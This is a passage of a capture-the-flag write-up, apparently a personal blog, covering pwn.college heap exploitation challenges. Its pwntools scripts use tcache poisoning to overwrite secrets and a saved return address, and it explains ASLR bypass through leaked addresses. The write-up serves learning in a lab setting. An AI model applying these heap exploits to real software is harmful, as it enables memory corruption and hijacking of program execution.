+<h5 id="Seeking-Secrets-Easy"><a href="#Seeking-Secrets-Easy" class="headerlink" title="Seeking Secrets (Easy)"></a><font style="color:#2F8EF4;">Seeking Secrets (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771088797323-464eff7d-98d2-4068-81a8-7456ab33e912.png" srcset="/img/loading.gif" lazyload></p>
+<p>leak secret??</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [2]: from pwn import *<br>   ...: i=1<br>   ...: def cyc():<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 1\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 2\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(0x423266))<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;puts\n&#x27;)<br>   ...: <br>   ...: #p=process(b&#x27;/challenge/freebin-feint-hard&#x27;)<br>   ...: p = process(&#x27;/challenge/seeking-secrets-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092310344-9e4f017f-77a0-45e4-a99c-c7f692b5d7c1.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092322071-7cd4fa70-beb4-43e7-91e4-1a4249795eac.png" srcset="/img/loading.gif" lazyload></p>
+<p>good</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092350765-6497fe1d-725e-4a0a-a37b-25547973a873.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Secrets-Hard"><a href="#Seeking-Secrets-Hard" class="headerlink" title="Seeking Secrets (Hard)"></a><font style="color:#2F8EF4;">Seeking Secrets (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092486146-aceae88b-f3bb-4037-ad8d-7de753aba093.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; x/s 0x42a03b<br>0x42a03b &lt;secret+41019&gt;:        &quot;&quot;<br><br>In [1]: from pwn import *<br>   ...: i=1<br>   ...: def cyc():<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 1\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 2\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(0x42a03b))<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;puts\n&#x27;)<br>   ...: <br>   ...: #p=process(b&#x27;/challenge/freebin-feint-hard&#x27;)<br>   ...: p = process(&#x27;/challenge/seeking-secrets-hard&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092711495-d91f15fa-de96-42f0-b1d8-e026c0eb9b1d.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Substantial-Secrets-Easy"><a href="#Seeking-Substantial-Secrets-Easy" class="headerlink" title="Seeking Substantial Secrets (Easy)"></a><font style="color:#2F8EF4;">Seeking Substantial Secrets (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771094324179-5a8be338-0480-4307-8383-11fc5ab5da31.png" srcset="/img/loading.gif" lazyload></p>
+<p>there is  ‘\00’ in secret</p>
+<p>we can utilize scanf to move secret</p>
+<p>send(16*b’0’)</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771094500923-c72faac5-3954-44f1-bf63-cc8557b56db3.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Substantial-Secrets-Hard"><a href="#Seeking-Substantial-Secrets-Hard" class="headerlink" title="Seeking Substantial Secrets (Hard)"></a><font style="color:#2F8EF4;">Seeking Substantial Secrets (Hard)</font></h5><p> 0x0000000000401be3 &lt;+1345&gt;:  lea    rsi,[rip+0x25467]        # 0x427051 &lt;secret+28753&gt;</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771094852736-d1f56ff0-108e-4424-8554-6d72986bfa22.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Spanless-Secrets-Easy"><a href="#Seeking-Spanless-Secrets-Easy" class="headerlink" title="Seeking Spanless Secrets (Easy)"></a><font style="color:#2F8EF4;">Seeking Spanless Secrets (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771097729328-f3ab73d2-9987-49ee-a641-657940b92760.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771097753642-ec090be4-e9a6-4e22-9f7d-2a62b4a2a034.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771097847239-afc7a736-15d0-4a60-a4da-d8d90f6978e5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [1]: from pwn import *<br>   ...: secret1 =18*b&#x27;k&#x27;<br>   ...: secret =16*b&#x27;k&#x27;<br>   ...: def cyc():<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 1\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 2\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(0x424308))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 2\n&#x27;)<br>   ...:     p.sendline(secret1)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;send_flag\n &#x27;)<br>   ...:     p.sendline(secret)<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;send_flag&#x27;)<br>   ...:     #p.send(secret)<br>   ...: #p=process(b&#x27;/challenge/freebin-feint-hard&#x27;)<br>   ...: p = process(&#x27;/challenge/seeking-spanless-secrets-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771098225042-1ac046aa-f6b4-456c-99ca-fc2af0a01b0d.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Spanless-Secrets-Hard"><a href="#Seeking-Spanless-Secrets-Hard" class="headerlink" title="Seeking Spanless Secrets (Hard)"></a><font style="color:#2F8EF4;">Seeking Spanless Secrets (Hard)</font></h5><p>0x0000000000401be3 &lt;+1345&gt;:  lea    rsi,[rip+0x29620]        # 0x42b20a &lt;secret+45578&gt;</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771098389203-ed2ede65-2d36-454e-8e0a-169013e4e699.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Smuggled-Secrets-Easy"><a href="#Seeking-Smuggled-Secrets-Easy" class="headerlink" title="Seeking Smuggled Secrets (Easy)"></a><font style="color:#2F8EF4;">Seeking Smuggled Secrets (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771098743309-7e35aad9-ac34-4c96-a184-caf4732e61fa.png" srcset="/img/loading.gif" lazyload></p>
+<p> The challenge mentions: <em>“If you attempt to malloc an address near where the secret is stored, it will be discarded.”</em></p>
+<p>_Obviously, _when you <code>free</code> a chunk and it goes into the <strong>tcache</strong> (Thread Local Cache), the allocator writes two pieces of metadata into the chunk’s user data area:</p>
+<ol>
+<li><code>**next**</code><em>: A pointer to the next free chunk in the tcache bin.</em></li>
+<li><code>**key**</code><em>: A 64-bit value used to detect <em><strong>Double Free</strong></em> vulnerabilities.</em></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong><font style="color:rgb(31, 31, 31);">Action</font></strong></th>
+<th><strong><font style="color:rgb(31, 31, 31);">What happens to the key?</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;malloc&lt;/font&gt;**</code></td>
+<td><font style="color:rgb(31, 31, 31);">The chunk is removed from the tcache. The allocator </font><strong><font style="color:rgb(31, 31, 31);">zeros out</font></strong><font style="color:rgb(31, 31, 31);"> the </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;key&lt;/font&gt;</code><font style="color:rgb(31, 31, 31);">field (and the </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;next&lt;/font&gt;</code><font style="color:rgb(31, 31, 31);">pointer) before handing the memory to you. This ensures that your “fresh” memory doesn’t contain sensitive heap pointers.</font></td>
+</tr>
+<tr>
+<td><code>**&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;free&lt;/font&gt;**</code></td>
+<td><font style="color:rgb(31, 31, 31);">The allocator checks if the chunk is already in the tcache using the </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;key&lt;/font&gt;</code><font style="color:rgb(31, 31, 31);">. If not, it stores the address of the </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;tcache_perthread_struct&lt;/font&gt;</code><font style="color:rgb(31, 31, 31);">into the </font><code>&lt;font style=&quot;color:rgb(68, 71, 70);&quot;&gt;key&lt;/font&gt;</code><font style="color:rgb(31, 31, 31);">field of the chunk.</font></td>
+</tr>
+</tbody></table>
+<p><strong>The <strong><code>**next**</code></strong> pointer</strong> is at the start of the chunk.</p>
+<p><strong>The <strong><code>**key**</code></strong> pointer</strong> is <font style="color:#DF2A3F;">8 bytes</font> after the start.</p>
+<p>Utilizing the <strong><font style="color:rgb(31, 31, 31);">zeros out </font></strong><font style="color:rgb(31, 31, 31);">in malloc to reset secret.</font></p>
+<p><font style="color:rgb(31, 31, 31);">In </font><code>&lt;font style=&quot;color:rgb(31, 31, 31);&quot;&gt;glibc&lt;/font&gt;</code><font style="color:rgb(31, 31, 31);"> heap management, memory is typically aligned to </font><strong><font style="color:#DF2A3F;">16 bytes</font>****.</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [9]: from pwn import *<br>   ...: addr = 0x427140<br>   ...: secret =16*b&#x27;\00&#x27;<br>   ...: def cyc():<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...: <br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 1\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 2\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(addr))<br>   ...:     print(p64(addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 3\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 4\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 3\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;free\n 4\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;scanf\n 4\n &#x27;)<br>   ...:     p.sendline(p64(addr-0x8))<br>   ...:     print(p64(addr-0x8))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 3\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;malloc\n 4\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;send_flag\n &#x27;)<br>   ...:     p.sendline(secret)<br>   ...:     #p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/send_flag/quit):&#x27;,b&#x27;send_flag&#x27;)<br>   ...:     #p.send(secret)<br>   ...: #p=process(b&#x27;/challenge/freebin-feint-hard&#x27;)<br>   ...: p = process(&#x27;/challenge/seeking-smuggled-secrets-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771136495136-0a93bbf6-ee79-47ee-87a7-af5710c9d0ba.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Seeking-Smuggled-Secrets-Hard"><a href="#Seeking-Smuggled-Secrets-Hard" class="headerlink" title="Seeking Smuggled Secrets (Hard)"></a><font style="color:#2F8EF4;">Seeking Smuggled Secrets (Hard)</font></h5><p>0x0000000000401c4b &lt;+1449&gt;:  lea    rsi,[rip+0x20e16]        # 0x422a68 &lt;secret+10856&gt;</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771136628346-5e451016-a9e0-4dcf-b69d-1970dec5cf91.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Heap-Hijinx"><a href="#Heap-Hijinx" class="headerlink" title="Heap Hijinx"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Heap Hijinx</font></h4><h5 id="Sus-Sequence-Easy"><a href="#Sus-Sequence-Easy" class="headerlink" title="Sus Sequence (Easy)"></a><font style="color:#2F8EF4;">Sus Sequence (Easy)</font></h5><p>The challenge mentions: “</p>
+<p>[<em>LEAK] The local stack address of your allocations is at: 0x7ffc2d8018f0.</em></p>
+<p><em>[LEAK] The address of main is at: 0x60315757bafd.</em>“</p>
+<p>Two critical pieces of information:</p>
+<ul>
+<li><strong>Stack Leak ( <strong>_0x7ffc2d8018f0 _</strong>):</strong> This tells you exactly where your <code>allocations</code> array (the list of pointers) is stored in memory. If you can overwrite a pointer here or a return address nearby, you can redirect the program’s execution.</li>
+<li><strong>Main Leak ( <strong>_0x60315757bafd _</strong>):</strong> This helps you bypass <strong>ASLR</strong> (Address Space Layout Randomization). By knowing where <code>main</code> is, you can calculate the location of other functions, like a <code>win()</code> function or the <code>system()</code> function in the C library.</li>
+</ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771139681270-500c6999-6a7b-40e5-a64a-afe8380bdd33.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771139872376-a1566744-834e-490a-923b-240b1cb8ff47.png" srcset="/img/loading.gif" lazyload></p>
+<p>Find win funtion</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771139974679-ed627388-ec86-49ba-8b69-918909f3e5a1.png" srcset="/img/loading.gif" lazyload></p>
+<p>win_addr &#x3D; (main_leak - 0x1afd) + 0x1a00  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771140175686-ed5d9d43-3a91-485d-bd73-e4f40cfe81be.png" srcset="/img/loading.gif" lazyload></p>
+<p>This is the start of  <code>allocations</code> array  (rbp - 0x110)</p>
+<p>ret_addr &#x3D; stack_leak + 0x110 +0x8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">In [3]: from pwn import *<br>   ...: addr = 0x422a68<br>   ...: secret =16*b&#x27;\00&#x27;<br>   ...: def cyc():<br>   ...:     p.recvuntil(b&quot;[LEAK] The local stack address of your allocations is at: &quot;)<br>   ...:     alloc_stack = p.recv(14)<br>   ...:     alloc_stack = int(alloc_stack, 16)<br>   ...:     p.recvuntil(b&quot;[LEAK] The address of main is at: &quot;)<br>   ...:     main_addr = p.recv(14)<br>   ...:     main_addr = int(main_addr, 16)<br>   ...:     ret_addr = alloc_stack + 0x118<br>   ...:     win_addr = main_addr - 0x1afd + 0x1a00<br>   ...:     print(hex(ret_addr))<br>   ...:     print(hex(win_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;free\n 1\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;free\n 2\n &#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(ret_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 1\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;malloc\n 2\n 88\n&#x27;)<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;scanf\n 2\n &#x27;)<br>   ...:     p.sendline(p64(win_addr))<br>   ...:     p.sendafter(b&#x27;[*] Function (malloc/free/puts/scanf/quit):&#x27;,b&#x27;q\n &#x27;)<br>   ...: <br>   ...: p = process(&#x27;/challenge/sus-sequence-easy&#x27;)<br>   ...:     #out = b&#x27;&#x27;<br>   ...: cyc()<br>   ...: p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141165851-77bfad7b-88c0-4df5-98f1-6457ad4f7e38.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#2F8EF4;"></font></p>
+<h5 id="Sus-Sequence-Hard"><a href="#Sus-Sequence-Hard" class="headerlink" title="Sus Sequence (Hard)"></a><font style="color:#2F8EF4;">Sus Sequence (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141263624-a2d0c43c-6fdd-490e-ab1e-32dc59303727.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141281070-7035a77e-a4cc-4edd-897b-a41b918943a3.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141336349-7dfb7738-e483-4bef-9dd5-fea46529cad5.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Echo-Emanations-Easy"><a href="#Echo-Emanations-Easy" class="headerlink" title="Echo Emanations (Easy)"></a><font style="color:#2F8EF4;">Echo Emanations (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771177234030-f89975ec-ba61-4fdf-8d4d-fa61f3339c6d.png" srcset="/img/loading.gif" lazyload></p>
+<p>wow</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771223163569-78acad55-435b-4ceb-a59e-9f4195321bf7.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>echo</strong>: Takes an index and a “length.” It calculates a new address (<code>pointer + length</code>) and passes it to a specialized <code>echo</code> function.  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771223400663-0d040c9d-f8b8-49e3-b49e-88293e1d5e72.png" srcset="/img/loading.gif" lazyload></p>
+<p>This function is a wrapper for the system call <code>execve</code>. It behaves as follows:</p>
+<ul>
+<li>It <code>malloc</code>s a new <strong>0x20 byte</strong> chunk.</li>
+<li>It builds an <code>argv</code> array (arguments for a program) inside that chunk:<ul>
+<li><code>argv[0]</code>: Points to the string <code>/bin/echo</code> (stored at <code>bin_echo</code>).</li>
+<li><code>argv[1]</code>: Points to the string <code>Data:</code>.</li>
+<li><code>argv[2]</code>: Points to the address calculated in <code>main</code> (<code>user_ptr + user_length</code>).</li>
+<li><code>argv[3]</code>: <code>NULL</code>.</li>
+</ul>
+</li>
+<li>It then <code>fork</code>s. The child process runs <code>execve(&quot;/bin/echo&quot;, argv, NULL)</code>, which effectively prints the data located at <code>user_ptr + user_length</code>.</li>
+</ul>
+<p>IDA</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771335889870-11a53115-bf02-47e6-bf08-417742989192.png" srcset="/img/loading.gif" lazyload></p>
+<p>what’s execve?</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771339682352-3185c699-f97c-4ada-8cec-7ec2b1e3e1e3.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771339129209-34143924-2339-40c0-9a27-93e684c038c3.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<p>Return to assembly</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771342587113-6c910a4d-c274-4bf4-a557-6fec42c3d010.png" srcset="/img/loading.gif" lazyload></p>
+<p>The “echo” funtion malloc 0x20 at start</p>
+<p>we can free a 0x20-chunk before call echo, the chunk-A will be allocted to echo funtion</p>
+<p>When call <code>echo 0 0</code>, the <code>echo</code> function does its own internal <code>malloc(0x20)</code> (32 bytes). Because of the LIFO rule, <strong>the <strong><code>**echo**</code></strong> function is now using <strong><code>**CHUNK_A**</code></strong> to build its <strong><code>**argv**</code></strong> array</strong></p>
+<p>The function then writes specific pointers into <code>CHUNK_A</code>:</p>
+<ul>
+<li><strong>At <strong><code>**CHUNK_A + 0**</code></strong>: It writes the address of the string <strong><code>**&quot;/bin/echo&quot;**</code></strong>.</strong></li>
